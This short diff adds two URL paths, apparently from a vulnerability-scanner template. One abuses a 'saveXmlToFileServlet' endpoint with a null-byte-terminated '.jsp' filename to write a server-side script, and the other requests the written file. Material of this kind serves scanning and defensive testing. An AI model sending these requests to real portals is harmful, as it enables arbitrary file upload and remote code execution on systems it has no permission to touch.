@@ -1,0 +1,2 @@
+/portal/pt/servlet/saveXmlToFileServlet/doPost?pageId=login&filename={{file_name}}.jsp%00
+/portal/processxml/{{file_name}}.jsp
